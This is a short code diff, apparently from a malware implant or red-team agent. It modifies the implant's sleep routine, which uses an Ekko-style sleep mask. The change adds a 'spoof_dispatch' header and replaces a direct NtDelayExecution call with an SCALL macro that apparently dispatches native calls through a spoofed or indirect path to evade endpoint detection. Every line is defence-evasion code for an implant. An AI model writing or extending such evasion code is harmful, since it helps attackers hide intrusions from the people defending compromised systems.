@@ -33,6 +33,7 @@
 #include <constexpr.h>
 #include <stdint.h>
 #include <evasion/sleep_mask_types.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifndef SLEEP_MASK_TYPE
 #define SLEEP_MASK_TYPE MASK_DEFAULT
@@ -132,7 +133,7 @@ static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     if ( !inst.evasion.ekko.initialized ) {
         LARGE_INTEGER delay;
         delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
-        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        SCALL( inst, ntdll.NtDelayExecution, FALSE, &delay );
         return;
     }
 
